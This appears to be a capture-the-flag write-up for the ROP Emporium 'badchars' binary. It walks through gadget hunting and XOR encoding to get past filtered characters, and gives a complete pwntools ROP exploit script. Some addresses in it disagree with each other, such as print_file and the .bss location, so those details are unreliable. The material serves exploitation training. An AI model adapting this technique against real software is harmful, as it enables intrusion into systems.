---
title: ROP Emporium - badchars Challenge Writeup
tags: [pwn, rop, binary exploitation, x64, encoding]
style: border
color: success
description: Writeup for the badchars challenge from ROP Emporium - bypassing bad character restrictions in ROP chains.
---

## Challenge Overview

The **badchars** challenge adds another layer of complexity: certain characters are filtered from our input. This simulates real-world scenarios where null bytes, newlines, or other characters might be filtered by input validation or protocol restrictions.

**Challenge Link**: [ROP Emporium - badchars](https://ropemporium.com/challenge/badchars.html)

## Challenge Requirements

Similar to write4, we need to:
1. Write the string `flag.txt` to memory
2. Call `print_file()` with a pointer to that string

However, certain "bad characters" are forbidden in our input and will be filtered out.

## Binary Analysis

### Initial Reconnaissance

```bash
$ file badchars
badchars: ELF 64-bit LSB executable, x86-64

$ checksec badchars
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ ldd badchars
    libbadchars.so => ./libbadchars.so
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

### Identifying Bad Characters

Running the binary and analyzing its behavior or examining the source shows that the following characters are filtered:

**Bad characters**: `x`, `g`, `a`, `.` (and possibly null bytes)

These characters appear in "flag.txt", so we can't write them directly!

### Static Analysis

```bash
$ ./badchars
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> test
Thank you!
Exiting
```

### Finding Important Addresses

```bash
$ r2 badchars
[0x00400650]> aaa
[0x00400650]> afl | grep print_file
0x00400620    1 6            sym.imp.print_file

# Writable sections
[0x00400650]> iS | grep -E "rw"
[23] 0x00601028     8 0x00601028     8 -rw- .data
[24] 0x00601038     0 0x00601038    16 -rw- .bss
```

Addresses:
- `print_file@plt`: `0x400510` (used in exploit)
- Writable `.bss` section: `0x601060` (used in exploit)
- Writable `.data` section: `0x601028`

### Finding ROP Gadgets

```bash
$ ROPgadget --binary badchars | grep "pop r12"
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

$ ROPgadget --binary badchars | grep "mov"
0x0000000000400634 : mov qword ptr [r13], r12 ; ret

$ ROPgadget --binary badchars | grep "xor"
0x0000000000400628 : xor byte ptr [r15], r14b ; ret

$ ROPgadget --binary badchars | grep "pop r14"
0x00000000004006a0 : pop r14 ; pop r15 ; ret

$ ROPgadget --binary badchars | grep "pop rdi"
0x00000000004006a3 : pop rdi ; ret
```

Perfect! We have:
- `pop r12; pop r13; pop r14; pop r15; ret` at `0x40069c` - for loading data, destination, and XOR values
- `mov [r13], r12; ret` at `0x400634` - for writing to memory
- `xor [r15], r14b; ret` at `0x400628` - for decoding characters
- `pop r14; pop r15; ret` at `0x4006a0` - for XOR operations
- `pop rdi; ret` at `0x4006a3` - for function arguments

## Exploitation Strategy

Since we can't use the characters in "flag.txt" directly, we need to:

1. **Encode** the string to avoid bad characters
2. **Write** the encoded string to memory
3. **Decode** the string in memory using XOR operations
4. **Call** `print_file()` with the decoded string

### Encoding Scheme

Let's use XOR encoding with individual keys for each bad character. We need to ensure that:
- Original character XORed with key = encoded character (no bad chars)
- Encoded character XORed with key = original character

Let's check which characters in "flag.txt" are bad:
- 'f' (0x66) - OK
- 'l' (0x6c) - OK
- 'a' (0x61) - **BAD** (0x61)
- 'g' (0x67) - **BAD** (0x67)
- '.' (0x2e) - **BAD** (0x2e)
- 't' (0x74) - OK
- 'x' (0x78) - **BAD** (0x78)
- 't' (0x74) - OK

### Finding Safe XOR Pairs

To find valid XOR pairs, we need to find values `i` and `j` such that:
1. `i ^ j = target_bad_char` (produces the character we need)
2. Neither `i` nor `j` is a bad character
3. `i` is a safe character we can write to memory
4. `j` is the XOR key we'll use

I created a helper script `badchars_helper.py` to automatically find all valid combinations:

```python
# badchars_helper.py
use = [0x78, 0x67, 0x61, 0x2e]  # Bad characters: 'x', 'g', 'a', '.'

for i in range(256):
    for j in range(256):
        if ( i ^ j ) == use[0]:  # Check for 'x'
            if ((i != use[0]) and (i != use[1]) and (i != use[2]) and (i != use[3])) and \
               ((j != use[0]) and (j != use[1]) and (j != use[2]) and (j != use[3])):
                print("Detected for 'x'")
                print("i = {}, j = {}".format(i, j))
        elif ( i ^ j ) == use[1]:  # Check for 'g'
            if ((i != use[0]) and (i != use[1]) and (i != use[2]) and (i != use[3])) and \
               ((j != use[0]) and (j != use[1]) and (j != use[2]) and (j != use[3])):
                print("Detected for 'g'")
                print("i = {}, j = {}".format(i, j))
        elif ( i ^ j ) == use[2]:  # Check for 'a'
            if ((i != use[0]) and (i != use[1]) and (i != use[2]) and (i != use[3])) and \
               ((j != use[0]) and (j != use[1]) and (j != use[2]) and (j != use[3])):
                print("Detected for 'a'")
                print("i = {}, j = {}".format(i, j))
        elif ( i ^ j ) == use[3]:  # Check for '.'
            if ((i != use[0]) and (i != use[1]) and (i != use[2]) and (i != use[3])) and \
               ((j != use[0]) and (j != use[1]) and (j != use[2]) and (j != use[3])):
                print("Detected for '.'")
                print("i = {}, j = {}".format(i, j))
```

Running this script helps us find safe character pairs. For our exploit, we chose:
- **'1' (0x31)** as our placeholder character (safe and not a bad char)

### XOR Key Selection

Using '1' (0x31) as our placeholder, we calculate the XOR keys needed:

- Position 2: '1' (0x31) ^ **80 (0x50)** = 'a' (0x61)
- Position 3: '1' (0x31) ^ **86 (0x56)** = 'g' (0x67)
- Position 4: '1' (0x31) ^ **31 (0x1F)** = '.' (0x2e)
- Position 6: '1' (0x31) ^ **73 (0x49)** = 'x' (0x78)

This gives us the final encoding strategy:
```
Written:   "fl111t1t"
After XOR: "flag.txt"
```

Position-by-position breakdown:
- Position 0-1: 'fl' → unchanged (not bad characters)
- Position 2: '1' ^ 80 → 'a'
- Position 3: '1' ^ 86 → 'g'
- Position 4: '1' ^ 31 → '.'
- Position 5: 't' → unchanged (not a bad character)
- Position 6: '1' ^ 73 → 'x'
- Position 7: 't' → unchanged (not a bad character)

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *
import sys

elf = ELF("badchars")
context.binary = elf
binary = elf.path
context.log_level = "debug"
IP, PORT = "address", 1337

global io
breakpoints = '''
b*pwnme+266
'''

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(binary, env = {'LD_PRELOAD': './libbadchars.so'})
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
else:
    io = process(binary, env = {'LD_PRELOAD': './libbadchars.so'})
    gdb.attach(io, breakpoints)

sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)
def main(io):
    # start pwn :)                      # 0x78; 0x67; 0x61; 0x2e
    xor = 0x0000000000400628            # xor byte ptr [r15], r14b; ret;
    pop_rdi = 0x00000000004006a3
    pop = 0x000000000040069c            # pop r12; pop r13; pop r14; pop r15; ret; 
    pop_2 = 0x00000000004006a0          # pop r14; pop r15; ret; 
    mov = 0x0000000000400634            # mov qword ptr [r13], r12; ret; 
    bss = 0x601060
    print_plt = 0x0000000000400510

    payload = b'b' * 32
    payload += b'c' * 8                 # rbp
    payload += p64(pop)
    payload += b'fl111t1t'
    payload += p64(bss)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(mov)
    payload += p64(pop_2)
    payload += p64(80)
    payload += p64(bss + 0x2)
    payload += p64(xor)
    payload += p64(pop_2)
    payload += p64(86)
    payload += p64(bss + 0x3)
    payload += p64(xor)
    payload += p64(pop_2)
    payload += p64(31)
    payload += p64(bss + 0x4)
    payload += p64(xor)
    payload += p64(pop_2)
    payload += p64(73)
    payload += p64(bss + 0x6)
    payload += p64(xor)
    payload += p64(pop_rdi)
    payload += p64(bss)
    payload += p64(print_plt)

    sla('> ', payload)

    io.interactive()

if __name__ == "__main__":
    main(io)
```

## Understanding the XOR Values

The XOR values were calculated using the helper script to ensure no bad characters appear:

```python
# Calculate XOR keys needed (can be verified with badchars_helper.py)
'1' (0x31) ^ ? = 'a' (0x61)  →  0x31 ^ 0x61 = 0x50 (80)
'1' (0x31) ^ ? = 'g' (0x67)  →  0x31 ^ 0x67 = 0x56 (86)
'1' (0x31) ^ ? = '.' (0x2e)  →  0x31 ^ 0x2e = 0x1F (31)
'1' (0x31) ^ ? = 'x' (0x78)  →  0x31 ^ 0x78 = 0x49 (73)
```

This approach is clever because:
1. '1' (0x31) is not a bad character - safe to write to memory
2. None of the XOR keys (80, 86, 31, 73) are bad characters - safe to use in our payload
3. The result of each XOR operation gives us exactly the bad character we need
4. The helper script verifies that thousands of other valid pairs exist, giving us flexibility

### Why Use a Helper Script?

The helper script is essential because:
- **Exhaustive search**: It checks all 65,536 possible byte combinations (256 × 256)
- **Validation**: Ensures both the placeholder and XOR key avoid bad characters
- **Multiple solutions**: Often finds dozens of valid pairs, giving you options
- **Debugging**: If one approach fails, you can quickly try another valid pair

You can run the helper script to find alternative encoding schemes if needed:

```bash
$ python3 badchars_helper.py
Detected for 'a'
i = 49, j = 80   # '1' ^ 80 = 'a' (our chosen solution)
Detected for 'g'
i = 49, j = 86   # '1' ^ 86 = 'g' (our chosen solution)
...
```

## Running the Exploit

```bash
$ python3 exploit_badchars.py
[*] '/path/to/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/path/to/badchars': pid 12345
[*] Receiving all data
[*] Process '/path/to/badchars' stopped with exit code 0 (pid 12345)

Thank you!
ROPE{a_placeholder_32byte_flag!}
```

## Debugging Tips

Verify the encoding/decoding process in GDB:

```bash
$ gdb ./badchars
gdb> break *0x400634  # Break at mov [r13], r12 (after write)
gdb> run < <(python3 exploit_badchars.py)
gdb> x/s 0x601028     # Should see encoded string
gdb> break *0x400628  # Break at xor [r15], r14b
gdb> continue
gdb> x/s 0x601028     # Should see progressively decoded string
```

## Key Takeaways

1. **Character Encoding**: Using XOR or other encoding schemes to avoid filtered characters
2. **Byte-Level Operations**: Using gadgets like `xor [reg], reg` to manipulate individual bytes
3. **Memory Manipulation**: Writing encoded data then decoding it in place
4. **Gadget Creativity**: Combining multiple gadgets to achieve complex transformations
5. **Real-World Application**: This simulates bypassing input filters in real exploits

This challenge demonstrates that even with input restrictions, creative use of ROP gadgets can overcome obstacles through encoding and runtime transformation.

---

**Challenge Completed**: ✓  
**Previous Challenge**: [write4](https://ropemporium.com/challenge/write4.html)  
**Next Challenge**: [fluff](https://ropemporium.com/challenge/fluff.html)

## Additional Notes

**Remaining Challenges**: The ROP Emporium series continues with:
- fluff - Complex gadget hunting
- pivot - Stack pivoting techniques
- ret2csu - Using universal gadgets from `__libc_csu_init`

These challenges further test advanced ROP techniques and are great for continuing your binary exploitation journey!
